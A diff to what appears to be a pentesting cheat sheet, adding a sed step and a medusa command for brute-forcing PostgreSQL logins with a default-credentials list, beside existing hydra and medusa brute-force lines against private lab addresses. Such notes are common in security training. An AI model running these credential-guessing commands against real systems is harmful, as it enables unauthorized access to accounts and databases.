@@ -575,6 +575,8 @@ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /usr/share/wordlists/
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.172.61 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:F=403' -f
 
 # mdusa
+sed 's/^/:/' /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt > postgres-defaultpasslist.txt
+medusa -C postgres-defaultpasslist.txt -h 192.168.175.47 -M postgres -n 5432 
 medusa -h 192.168.168.108 -u postgres -P /usr/share/seclists/Passwords/UserPassCombo-Jay.txt -M postgres -n 5432
 ```
 ## hashcrack
